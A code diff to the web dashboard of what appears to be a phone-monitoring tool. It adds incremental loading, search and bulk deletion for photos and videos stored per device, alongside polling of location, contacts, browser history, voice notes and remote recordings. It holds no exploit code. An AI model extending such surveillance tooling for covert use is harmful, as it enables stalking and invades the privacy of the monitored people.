@@ -325,11 +325,12 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="tab-photos">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F4F8; Photos <span id="photoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
+<input id="photoSearch" type="text" placeholder="Search photos..." style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:140px" oninput="renderPhotosFromCache()">
 <div style="display:flex;gap:6px">
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" id="btnSelectAllPhotos">&#x1F4CB; Select All</span>
 <span class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px;cursor:pointer" id="btnDeleteSelectedPhotos" onclick="deleteSelectedPhotos()">&#x1F5D1; Delete Selected</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="loadAllPhotos()">&#x1F4C2; Load All</span>
-<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="photoOffset=0;cachedPhotos={};pollPhotos()">&#x1F504; Refresh</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshPhotos()">&#x1F504; Refresh</span>
 </div>
 </div>
 <div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
@@ -339,8 +340,10 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F3AC; Videos <span id="videoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" id="btnSelectAllVideos">&#x1F4CB; Select All</span>
+<span class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px;cursor:pointer" id="btnDeleteSelectedVideos" onclick="deleteSelectedVideos()">&#x1F5D1; Delete Selected</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="loadAllVideos()">&#x1F4C2; Load All</span>
-<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="videoOffset=0;cachedVideos={};pollVideos()">&#x1F504; Refresh</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="refreshVideos()">&#x1F504; Refresh</span>
 </div>
 </div>
 <div class="filter-chips" id="videoSourceChips">
@@ -778,6 +781,9 @@ const VIDEO_BATCH = 24;
 let videoLoading = false;
 let videoSourceFilter = 'all';
 let cachedVideos = {};
+let selectedVideoKeys = new Set();
+let videoRendered = new Set();
+let videoState = { deviceId: null };
 let recentsTimeRange = '24h';
 let recentsSearchQuery = '';
 let recentsGroupedState = JSON.parse(localStorage.getItem('recentsGrouped') || '{}');
@@ -1078,8 +1084,8 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'storage') refreshStorage();
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
-    if (btn.dataset.tab === 'photos') pollPhotos();
-    if (btn.dataset.tab === 'videos') pollVideos();
+    if (btn.dataset.tab === 'photos') { renderPhotosFromCache(); pollPhotos(); }
+    if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
     if (btn.dataset.tab === 'recents') pollAppSnapshots();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
@@ -1266,49 +1272,63 @@ renderAppSnapshots = function() {
   renderRecents();
 };
 
-// --- Videos Tab ---
-async function pollVideos() {
-  if (!selectedDevice) return;
-  await loadVideos();
+// --- Videos Tab (incremental) ---
+function clearVideoCache() {
+  for (const v of Object.values(cachedVideos)) {
+    if (v && v._blobUrl) { try { URL.revokeObjectURL(v._blobUrl); } catch {} }
+  }
+  cachedVideos = {};
+  videoKeys = [];
+  videoOffset = 0;
+  selectedVideoKeys.clear();
+  videoRendered.clear();
+  videoState.deviceId = null;
+  updateVideoSelectionUI();
 }
 
-async function loadVideos() {
+function videoLastCachedKey() {
+  return videoKeys.length ? videoKeys[0] : null;
+}
+
+function updateVideoCount() {
+  const el = document.getElementById('videoCount');
+  if (el) el.textContent = '(' + videoKeys.length + ')';
+}
+
+async function pollVideos() {
   if (!selectedDevice) return;
+  if (videoState.deviceId !== selectedDevice) clearVideoCache();
+  videoState.deviceId = selectedDevice;
   if (videoLoading) return;
   videoLoading = true;
   try {
-    const grid = document.getElementById('videoGrid');
-    const lmContainer = document.getElementById('videoLoadMoreContainer');
-
-    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, 'shallow=true');
+    const lastKey = videoLastCachedKey();
+    const enc = lastKey ? encodeURIComponent(JSON.stringify(lastKey)) : null;
+    const q = enc ? `orderBy=%22%24key%22&startAt=${enc}&limitToLast=300` : `orderBy=%22%24key%22&limitToLast=300`;
+    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, q);
     if (!keysData || typeof keysData !== 'object') {
-      if (!Object.keys(cachedVideos).length) { videoKeys = []; renderVideos(); return; }
+      if (!Object.keys(cachedVideos).length) { videoKeys = []; renderVideos(); }
       return;
     }
-
-    const allKeys = Object.keys(keysData).sort((a, b) => parseInt(b) - parseInt(a));
-    const freshKeys = allKeys.filter(k => !cachedVideos[k]);
-
-    // If nothing new and grid already has content, just update count
-    if (freshKeys.length === 0 && grid.children.length > 0 && !grid.querySelector('.label')) {
-      videoKeys = allKeys;
-      document.getElementById('videoCount').textContent = '(' + allKeys.length + ')';
-      return;
-    }
-
-    videoKeys = allKeys;
-    document.getElementById('videoCount').textContent = '(' + videoKeys.length + ')';
+    const freshKeys = Object.keys(keysData).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
+    const merged = new Set([...freshKeys, ...videoKeys]);
+    videoKeys = [...merged].sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
     videoOffset = 0;
-    grid.innerHTML = '';
-    if (lmContainer) lmContainer.innerHTML = '';
+    updateVideoCount();
     await loadMoreVideos(true);
   } catch (e) { console.error('loadVideos:', e); }
   finally { videoLoading = false; }
 }
 
+async function refreshVideos() {
+  videoState.deviceId = null;
+  clearVideoCache();
+  await pollVideos();
+}
+
 async function loadAllVideos() {
   if (!selectedDevice) return;
-  if (!videoKeys.length) await loadVideos();
+  if (!videoKeys.length) await pollVideos();
   videoLoading = false;
   while (videoOffset < videoKeys.length) {
     await loadMoreVideos(true);
@@ -1324,37 +1344,37 @@ async function loadMoreVideos(skipGuard = false) {
   const batch = videoKeys.slice(videoOffset, end);
   videoOffset = end;
 
-  // Fetch uncached entries in this batch and deduplicate
   const lmContainer = document.getElementById('videoLoadMoreContainer');
   const uncachedCount = batch.filter(k => !cachedVideos[k]).length;
   if (uncachedCount > 0 && lmContainer) {
     lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading ' + uncachedCount + ' video(s)...</div>';
-  }
-  const dedupSet = new Set();
-  for (const v of Object.values(cachedVideos)) {
-    if (v && v.fileName && v.dateAdded) dedupSet.add(v.fileName + '|' + v.dateAdded);
   }
   for (const k of batch) {
     if (cachedVideos[k]) continue;
     try {
       const entry = await fetchRTDB(`devices/${selectedDevice}/videos/${k}`);
       if (entry && typeof entry === 'object' && (entry.storageUrl || entry.data)) {
-        const dedupKey = (entry.fileName || '') + '|' + (entry.dateAdded || '');
-        if (dedupKey !== '|' && dedupSet.has(dedupKey)) continue;
+        entry._key = k;
         cachedVideos[k] = entry;
-        if (dedupKey !== '|') dedupSet.add(dedupKey);
       }
     } catch {}
   }
   videoLoading = false;
 
-  const filtered = batch.filter(k => {
-    if (videoSourceFilter === 'all') return true;
-    const v = cachedVideos[k];
-    return v && (v.source === videoSourceFilter);
-  });
-  if (filtered.length) renderVideoGroup(filtered);
+  const newRendered = batch.filter(k => cachedVideos[k] && !videoRendered.has(k) && (videoSourceFilter === 'all' || cachedVideos[k].source === videoSourceFilter));
+  if (newRendered.length) renderVideoGroup(newRendered);
   renderVideos();
+
+  const keys = Object.keys(cachedVideos).sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
+  if (keys.length > 300) {
+    const toDrop = keys.slice(300);
+    toDrop.forEach(k => {
+      if (cachedVideos[k] && cachedVideos[k]._blobUrl) { try { URL.revokeObjectURL(cachedVideos[k]._blobUrl); } catch {} }
+      delete cachedVideos[k];
+      videoRendered.delete(k);
+    });
+  }
+
   const container = document.getElementById('videoLoadMoreContainer');
   container.innerHTML = '';
   if (videoOffset < videoKeys.length) {
@@ -1371,7 +1391,8 @@ function renderVideoGroup(keys) {
   const videos = cachedVideos;
   for (const k of keys) {
     const v = videos[k];
-    if (!v || (!v.storageUrl && !v.data)) continue;
+    if (!v || (!v.storageUrl && !v.data)) { videoRendered.add(k); continue; }
+    videoRendered.add(k);
     const date = v.dateAdded ? new Date(v.dateAdded) : new Date(v.ts_ms);
     const dateStr = date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
     const timeStr = date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
@@ -1390,15 +1411,28 @@ function renderVideoGroup(keys) {
       grid.appendChild(dayDiv);
     }
     const wrap = document.createElement('div');
-    wrap.className = 'pwrap';
+    wrap.className = 'pwrap' + (selectedVideoKeys.has(k) ? ' selected' : '');
     wrap.style.aspectRatio = v.width && v.height ? v.width + '/' + v.height : '16/9';
+    wrap.dataset.vkey = k;
     const thumb = v.thumb ? 'data:image/jpeg;base64,' + v.thumb : 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 9"%3E%3Crect width="16" height="9" fill="%23161b22"/%3E%3Ctext x="8" y="6" text-anchor="middle" fill="%238b949e" font-size="4"%3E\u25B6%3C/text%3E%3C/svg%3E';
     const img = document.createElement('img');
     img.loading = 'lazy';
     img.src = thumb;
     img.alt = v.fileName || 'Video';
-    img.onclick = () => openVideoPlayer(v.storageUrl || v.data, v);
+    img.onclick = (ev) => { if (ev.target.closest('.video-select') || ev.target.closest('[data-delvideo]')) return; openVideoPlayer(v.storageUrl || v.data, v); };
     wrap.appendChild(img);
+    const sel = document.createElement('div');
+    sel.className = 'video-select';
+    sel.style.cssText = 'position:absolute;top:4px;right:4px;z-index:3;background:rgba(0,0,0,.5);border-radius:4px;padding:2px;display:none';
+    sel.innerHTML = '<input type="checkbox"' + (selectedVideoKeys.has(k) ? ' checked' : '') + '>';
+    wrap.appendChild(sel);
+    const del = document.createElement('button');
+    del.className = 'chip';
+    del.textContent = '\u{1F5D1}';
+    del.dataset.delvideo = k;
+    del.title = 'Delete video';
+    del.style.cssText = 'position:absolute;top:4px;left:4px;z-index:3;background:var(--danger);color:#000;font-size:9px;padding:2px 6px;border:none;border-radius:4px;cursor:pointer';
+    wrap.appendChild(del);
     const cap = document.createElement('div');
     cap.className = 'pcap';
     cap.innerHTML = '<span style="font-size:10px">\u25B6 ' + (v.fileName || 'Video') + '</span><div class="ptime">' + timeStr + (v.source ? ' \u00B7 ' + v.source : '') + (v.durationMs ? ' \u00B7 ' + Math.round(v.durationMs/1000) + 's' : '') + '</div>';
@@ -1406,9 +1440,7 @@ function renderVideoGroup(keys) {
     const dayDivs = grid.querySelectorAll('.photo-day');
     let targetDay = null;
     for (const dd of dayDivs) {
-      if (dd.querySelector('.photo-day-header')?.textContent.includes(dateStr)) {
-        targetDay = dd; break;
-      }
+      if (dd.querySelector('.photo-day-header')?.textContent.includes(dateStr)) { targetDay = dd; break; }
     }
     if (targetDay) targetDay.appendChild(wrap);
     else grid.appendChild(wrap);
@@ -1422,13 +1454,132 @@ function renderVideos() {
   }
 }
 
+function renderVideosFromCache() {
+  const grid = document.getElementById('videoGrid');
+  if (!grid) return;
+  grid.innerHTML = '';
+  videoRendered.clear();
+  renderVideoGroup(videoKeys.filter(k => cachedVideos[k] && (videoSourceFilter === 'all' || cachedVideos[k].source === videoSourceFilter)));
+  renderVideos();
+  const container = document.getElementById('videoLoadMoreContainer');
+  container.innerHTML = '';
+  if (videoOffset < videoKeys.length) {
+    const btn = document.createElement('button');
+    btn.className = 'load-more-btn';
+    btn.textContent = '\u2B07 Load more videos (' + (videoKeys.length - videoOffset) + ' remaining)';
+    btn.onclick = () => loadMoreVideos();
+    container.appendChild(btn);
+  }
+}
+
+function updateVideoSelectionUI() {
+  const del = document.getElementById('btnDeleteSelectedVideos');
+  if (del) del.textContent = '\u{1F5D1} Delete Selected' + (selectedVideoKeys.size ? ' (' + selectedVideoKeys.size + ')' : '');
+  const sel = document.getElementById('btnSelectAllVideos');
+  if (sel) sel.textContent = selectedVideoKeys.size && Object.keys(cachedVideos).length && selectedVideoKeys.size >= Object.keys(cachedVideos).length ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
+}
+
+function toggleVideoSelect(k, checked) {
+  if (checked) selectedVideoKeys.add(k);
+  else selectedVideoKeys.delete(k);
+  const wrap = document.querySelector('.pwrap[data-vkey="' + k + '"]');
+  if (wrap) {
+    wrap.classList.toggle('selected', checked);
+    const cb = wrap.querySelector('.video-select input');
+    if (cb) cb.checked = checked;
+  }
+  updateVideoSelectionUI();
+}
+
+const videoGridEl = document.getElementById('videoGrid');
+if (videoGridEl) {
+  videoGridEl.addEventListener('change', (e) => {
+    const cb = e.target;
+    if (cb && cb.type === 'checkbox' && cb.closest('.video-select')) {
+      const wrap = cb.closest('.pwrap');
+      const k = wrap && wrap.dataset.vkey;
+      if (k) toggleVideoSelect(k, cb.checked);
+    }
+  });
+  videoGridEl.addEventListener('click', (e) => {
+    const btn = e.target.closest('[data-delvideo]');
+    if (btn) { e.stopPropagation(); deleteVideo(btn.dataset.delvideo); }
+  });
+}
+
+document.getElementById('btnSelectAllVideos')?.addEventListener('click', function() {
+  const all = Object.keys(cachedVideos);
+  const selecting = selectedVideoKeys.size < all.length;
+  selectedVideoKeys.clear();
+  if (selecting) all.forEach(k => selectedVideoKeys.add(k));
+  this.textContent = selecting ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
+  updateVideoSelectionUI();
+  document.querySelectorAll('#videoGrid .pwrap[data-vkey]').forEach(w => {
+    const k = w.dataset.vkey;
+    w.classList.toggle('selected', selectedVideoKeys.has(k));
+    const cb = w.querySelector('.video-select input');
+    if (cb) cb.checked = selectedVideoKeys.has(k);
+  });
+});
+
+async function deleteVideoRTDB(k) {
+  try { return await deleteRTDB(`devices/${selectedDevice}/videos/${k}`); } catch { return false; }
+}
+
+async function deleteVideo(k) {
+  if (!selectedDevice) return;
+  if (!confirm('Delete this video from RTDB?')) return;
+  const ok = await deleteVideoRTDB(k);
+  if (ok) {
+    showAlert('Video deleted', 'warn');
+    if (cachedVideos[k] && cachedVideos[k]._blobUrl) { try { URL.revokeObjectURL(cachedVideos[k]._blobUrl); } catch {} }
+    delete cachedVideos[k];
+    videoRendered.delete(k);
+    selectedVideoKeys.delete(k);
+    videoKeys = videoKeys.filter(x => x !== k);
+    const wrap = document.querySelector('.pwrap[data-vkey="' + k + '"]');
+    if (wrap) wrap.remove();
+    updateVideoSelectionUI();
+    updateVideoCount();
+    renderVideos();
+  } else {
+    showAlert('Delete failed', 'error');
+  }
+}
+
+async function deleteSelectedVideos() {
+  if (!selectedDevice) return;
+  if (!selectedVideoKeys.size) { showAlert('No videos selected', 'error'); return; }
+  if (!confirm('Delete ' + selectedVideoKeys.size + ' selected videos from RTDB?\nThis cannot be undone.')) return;
+  let deleted = 0, failed = 0;
+  for (const k of [...selectedVideoKeys]) {
+    if (await deleteVideoRTDB(k)) deleted++;
+    else failed++;
+  }
+  for (const k of [...selectedVideoKeys]) {
+    if (cachedVideos[k] && cachedVideos[k]._blobUrl) { try { URL.revokeObjectURL(cachedVideos[k]._blobUrl); } catch {} }
+    delete cachedVideos[k];
+    videoRendered.delete(k);
+    const wrap = document.querySelector('.pwrap[data-vkey="' + k + '"]');
+    if (wrap) wrap.remove();
+  }
+  selectedVideoKeys.clear();
+  videoKeys = videoKeys.filter(x => cachedVideos[x]);
+  updateVideoSelectionUI();
+  updateVideoCount();
+  renderVideos();
+  showAlert('Deleted ' + deleted + ' videos' + (failed ? ', failed ' + failed : ''), deleted > 0 ? 'warn' : 'error');
+}
+
 function openVideoPlayer(src, meta) {
   const overlay = document.getElementById('videoPlayerOverlay');
   const player = document.getElementById('videoPlayer');
   const metaEl = document.getElementById('videoPlayerMeta');
   if (!overlay || !player) return;
   if (src && !src.startsWith('http') && !src.startsWith('data:')) {
-    src = 'data:video/mp4;base64,' + src;
+    if (!meta._blobUrl) meta._blobUrl = base64ToBlobUrl(src, 'video/mp4');
+    if (meta._blobUrl) src = meta._blobUrl;
+    else src = 'data:video/mp4;base64,' + src;
   }
   player.src = src;
   player.load();
@@ -1456,14 +1607,7 @@ document.querySelectorAll('.chip[data-vsource]').forEach(chip => {
     document.querySelectorAll('.chip[data-vsource]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     videoSourceFilter = chip.dataset.vsource;
-    videoOffset = 0;
-    videoLoading = false;
-    const grid = document.getElementById('videoGrid');
-    grid.innerHTML = '';
-    const container = document.getElementById('videoLoadMoreContainer');
-    container.innerHTML = '';
-    if (cachedVideos && Object.keys(cachedVideos).length) loadMoreVideos();
-    else pollVideos();
+    renderVideosFromCache();
   });
 });
 
@@ -1474,9 +1618,8 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   localStorage.setItem('selectedDevice', selectedDevice);
   locationHistory = [];
   historyAutoLoaded = false;
-  cachedPhotos = {};
-  photoKeys = [];
-  photoOffset = 0;
+  clearPhotoCache();
+  clearVideoCache();
   playbackPoints = [];
   timelineCache = null;
   appsCache = null;
@@ -1487,8 +1630,6 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   appSnapshotsLastSync = 0;
   contactsCache = null;
   contactsSyncTs = 0;
-  cachedVideos = {};
-  videoKeys = [];
   wifiCache = [];
   logcatCache = [];
   window.permCache = null;
@@ -1532,6 +1673,7 @@ function startPolling() {
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('health', 60000, pollHealth);
+  schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
 }
 
@@ -1544,7 +1686,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -1736,11 +1878,133 @@ async function pollMeta() {
   }
 }
 
-// --- Photos (Lazy Load) ---
+// --- Photos (Lazy Load, incremental) ---
 let photoKeys = [];
 let photoOffset = 0;
 const PHOTO_BATCH = 24;
 let photoLoading = false;
+let photoDateKeys = {};
+let photoDateWatermarks = {};
+let photoAllPaths = [];
+let photoState = { deviceId: null };
+
+function clearPhotoCache() {
+  cachedPhotos = {};
+  photoDateKeys = {};
+  photoDateWatermarks = {};
+  photoAllPaths = [];
+  photoKeys = [];
+  photoOffset = 0;
+  photoState.deviceId = null;
+  selectedPhotoKeys.clear();
+  updatePhotoSelectionUI();
+}
+
+function rebuildPhotoAllPaths() {
+  const paths = [];
+  for (const d of Object.keys(photoDateKeys)) {
+    for (const t of photoDateKeys[d]) paths.push(d + '/' + t);
+  }
+  paths.sort((a, b) => parseInt(b.split('/')[1], 10) - parseInt(a.split('/')[1], 10));
+  photoAllPaths = paths;
+}
+
+function mergePhotoDateKeys(date, tsKeys) {
+  const existing = photoDateKeys[date] || [];
+  const set = new Set(existing);
+  for (const t of tsKeys) if (t) set.add(t);
+  photoDateKeys[date] = [...set].sort((a, b) => parseInt(b, 10) - parseInt(a, 10));
+  const maxT = photoDateKeys[date][0];
+  if (maxT) photoDateWatermarks[date] = maxT;
+  rebuildPhotoAllPaths();
+}
+
+async function syncPhotoIndex() {
+  if (!selectedDevice) return;
+  const datesData = await fetchRTDB(`devices/${selectedDevice}/photos`, 'shallow=true');
+  if (!datesData || typeof datesData !== 'object') {
+    if (!Object.keys(cachedPhotos).length) { photoDateKeys = {}; photoDateWatermarks = {}; rebuildPhotoAllPaths(); }
+    return;
+  }
+  const dates = Object.keys(datesData).filter(d => !d.startsWith('_'));
+  for (const date of dates) {
+    const wm = photoDateWatermarks[date];
+    try {
+      if (wm) {
+        const enc = encodeURIComponent(JSON.stringify(wm));
+        const sub = await fetchRTDB(`devices/${selectedDevice}/photos/${date}`, `orderBy=%22%24key%22&startAt=${enc}&limitToLast=200`);
+        if (sub && typeof sub === 'object') mergePhotoDateKeys(date, Object.keys(sub));
+      } else {
+        const sub = await fetchRTDB(`devices/${selectedDevice}/photos/${date}`, 'shallow=true');
+        if (sub && typeof sub === 'object') mergePhotoDateKeys(date, Object.keys(sub));
+      }
+    } catch {}
+  }
+  for (const d of Object.keys(photoDateKeys)) {
+    if (!dates.includes(d)) { delete photoDateKeys[d]; delete photoDateWatermarks[d]; }
+  }
+  rebuildPhotoAllPaths();
+}
+
+async function fetchPhotoBatch() {
+  if (!selectedDevice || !photoAllPaths.length || photoLoading) return;
+  photoLoading = true;
+  const batch = photoAllPaths.slice(photoOffset, photoOffset + PHOTO_BATCH);
+  for (const path of batch) {
+    if (cachedPhotos[path]) continue;
+    const slash = path.indexOf('/');
+    const date = path.slice(0, slash), ts = path.slice(slash + 1);
+    try {
+      const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${date}/${ts}`);
+      if (doc && doc.data && doc.data.startsWith('/9j/')) {
+        doc.key = path;
+        doc._date = date;
+        doc._ts = ts;
+        cachedPhotos[path] = doc;
+      }
+    } catch {}
+    if (Object.keys(cachedPhotos).length >= 500) break;
+  }
+  photoOffset += batch.length;
+  photoLoading = false;
+  const entries = Object.keys(cachedPhotos);
+  if (entries.length > 500) {
+    entries.sort((a, b) => parseInt(b.split('/')[1], 10) - parseInt(a.split('/')[1], 10));
+    const toDrop = entries.slice(500);
+    toDrop.forEach(k => delete cachedPhotos[k]);
+  }
+}
+
+async function pollPhotos() {
+  if (!selectedDevice) return;
+  if (photoState.deviceId !== selectedDevice) clearPhotoCache();
+  photoState.deviceId = selectedDevice;
+  await syncPhotoIndex();
+  photoOffset = 0;
+  await fetchPhotoBatch();
+  renderPhotosFromCache();
+}
+
+async function refreshPhotos() {
+  photoState.deviceId = null;
+  clearPhotoCache();
+  await pollPhotos();
+}
+
+async function loadMorePhotos() {
+  await fetchPhotoBatch();
+  renderPhotosFromCache();
+}
+
+async function loadAllPhotos() {
+  if (!selectedDevice) { await pollPhotos(); return; }
+  photoLoading = false;
+  while (photoOffset < photoAllPaths.length) {
+    await fetchPhotoBatch();
+    await new Promise(r => setTimeout(r, 10));
+  }
+  renderPhotosFromCache();
+}
 
 function dateBucket(ts) {
   if (!ts) return 'Older';
@@ -1762,29 +2026,39 @@ function renderPhotosFromCache() {
   const countEl = document.getElementById('photoCount');
   const lmContainer = document.getElementById('loadMoreContainer');
   if (!grid) return;
-  if (!Object.keys(cachedPhotos).length) {
-    const total = photoKeys.length;
-    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; ' + (total ? 'Loaded ' + photoOffset + '/' + total + ' &mdash; click Load More below' : 'No photos yet') + '</div>';
+  const search = (document.getElementById('photoSearch')?.value || '').trim().toLowerCase();
+  const docs = Object.values(cachedPhotos).filter(doc => {
+    if (!doc || !doc.data) return false;
+    if (search) {
+      const hay = ((doc.fileName || '') + ' ' + (doc.dateTaken || '')).toLowerCase();
+      if (hay.indexOf(search) === -1) return false;
+    }
+    return true;
+  });
+  if (!docs.length) {
+    const total = photoAllPaths.length;
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F4F8; ' + (Object.keys(cachedPhotos).length ? 'No photos match the search' : (total ? 'Loading photos\u2026' : 'No photos yet')) + '</div>';
     if (countEl) countEl.innerHTML = total ? '&middot; ' + total + ' total' : '';
     if (lmContainer) lmContainer.innerHTML = '';
+    updatePhotoSelectionUI();
     return;
   }
 
-  // Dedup by (fileName, dateTaken) keeping highest quality
+  // Dedup by md5 (or fileName|dateTaken) keeping highest quality
   const dedup = {};
-  for (const doc of Object.values(cachedPhotos)) {
-    if (!doc || !doc.data) continue;
-    const key = (doc.fileName || '') + '|' + (doc.dateTaken || '');
+  for (const doc of docs) {
+    const key = doc.md5 || ((doc.fileName || '') + '|' + (doc.dateTaken || ''));
     const existing = dedup[key];
     if (!existing || (doc.data.length > existing.data.length)) dedup[key] = doc;
   }
+  const dedupDocs = Object.values(dedup);
 
-  const totalStr = photoKeys.length ? ' &middot; ' + photoKeys.length + ' total' : '';
-  if (countEl) countEl.innerHTML = '&middot; ' + Object.keys(dedup).length + ' loaded' + totalStr;
+  const totalStr = photoAllPaths.length ? ' &middot; ' + photoAllPaths.length + ' total' : '';
+  if (countEl) countEl.innerHTML = '&middot; ' + dedupDocs.length + ' loaded' + totalStr;
 
   // Group by date bucket
   const groups = {};
-  for (const doc of Object.values(dedup)) {
+  for (const doc of dedupDocs) {
     const ts = doc.dateTaken || doc.timestamp || 0;
     const bucket = dateBucket(ts);
     if (!groups[bucket]) groups[bucket] = [];
@@ -1804,8 +2078,10 @@ function renderPhotosFromCache() {
       const dateTaken = doc.dateTaken ? pkt(doc.dateTaken) : '';
       const fileName = doc.fileName || '';
       const synced = pkt(ts);
-      html += '<div class="pwrap" data-ts="' + ts + '" data-photokey="' + (doc.key || '') + '" onclick="if(!event.target.closest(\'.photo-select\'))openPhotoLightbox(this)">' +
-        '<div class="photo-select" style="position:absolute;top:4px;right:4px;z-index:2;background:rgba(0,0,0,.5);border-radius:4px;padding:2px;display:none" onclick="event.stopPropagation();togglePhotoSelect(this)"><input type="checkbox"></div>' +
+      const selected = selectedPhotoKeys.has(doc.key);
+      const checked = selected ? ' checked' : '';
+      html += '<div class="pwrap' + (selected ? ' selected' : '') + '" data-ts="' + ts + '" data-photokey="' + (doc.key || '') + '" onclick="if(!event.target.closest(\'.photo-select\'))openPhotoLightbox(this)">' +
+        '<div class="photo-select" style="position:absolute;top:4px;right:4px;z-index:2;background:rgba(0,0,0,.5);border-radius:4px;padding:2px;display:none" onclick="event.stopPropagation();togglePhotoSelect(this)"><input type="checkbox"' + checked + '></div>' +
         '<img src="data:image/jpeg;base64,' + doc.data + '" loading="lazy" decoding="async">' +
         '<div class="pcap"><div>' + escHtml(fileName || dateTaken || synced) + '</div>' +
         '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div></div>';
@@ -1813,20 +2089,27 @@ function renderPhotosFromCache() {
     html += '</div></div>';
   }
 
-  const loaded = Object.keys(dedup).length;
   grid.innerHTML = html || '<div class="label" style="margin:20px 0">&#x1F4F8; No photos matched</div>';
 
   // Load more button
-  if (photoOffset < photoKeys.length) {
-    const remaining = photoKeys.length - photoOffset;
+  if (photoOffset < photoAllPaths.length) {
+    const remaining = photoAllPaths.length - photoOffset;
     lmContainer.innerHTML = '<div class="load-more-btn" onclick="loadMorePhotos()">&#x2B07; Load ' + Math.min(PHOTO_BATCH, remaining) + ' more (' + remaining + ' remaining)</div>';
   } else {
-    lmContainer.innerHTML = loaded > 0 ? '<div style="text-align:center;font-size:13px;color:var(--muted);margin-top:6px">&#x2714; All photos loaded (' + loaded + ')</div>' : '';
+    lmContainer.innerHTML = dedupDocs.length > 0 ? '<div style="text-align:center;font-size:13px;color:var(--muted);margin-top:6px">&#x2714; All photos loaded (' + dedupDocs.length + ')</div>' : '';
   }
+  updatePhotoSelectionUI();
 }
 
 // --- Photo selection ---
 let selectedPhotoKeys = new Set();
+
+function updatePhotoSelectionUI() {
+  const del = document.getElementById('btnDeleteSelectedPhotos');
+  if (del) del.textContent = '\u{1F5D1} Delete Selected' + (selectedPhotoKeys.size ? ' (' + selectedPhotoKeys.size + ')' : '');
+  const sel = document.getElementById('btnSelectAllPhotos');
+  if (sel) sel.textContent = selectedPhotoKeys.size && Object.keys(cachedPhotos).length && selectedPhotoKeys.size >= Object.keys(cachedPhotos).length ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
+}
 
 function togglePhotoSelect(el) {
   const wrap = el.closest('.pwrap');
@@ -1838,107 +2121,48 @@ function togglePhotoSelect(el) {
   if (cb) cb.checked = wrap.classList.contains('selected');
   if (wrap.classList.contains('selected')) selectedPhotoKeys.add(key);
   else selectedPhotoKeys.delete(key);
-  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected' + (selectedPhotoKeys.size ? ' (' + selectedPhotoKeys.size + ')' : '');
+  updatePhotoSelectionUI();
 }
 
 document.getElementById('btnSelectAllPhotos')?.addEventListener('click', function() {
-  const all = document.querySelectorAll('#photoGrid .pwrap');
+  const all = Object.keys(cachedPhotos);
   const selecting = selectedPhotoKeys.size < all.length;
   selectedPhotoKeys.clear();
-  all.forEach(w => {
-    w.classList.toggle('selected', selecting);
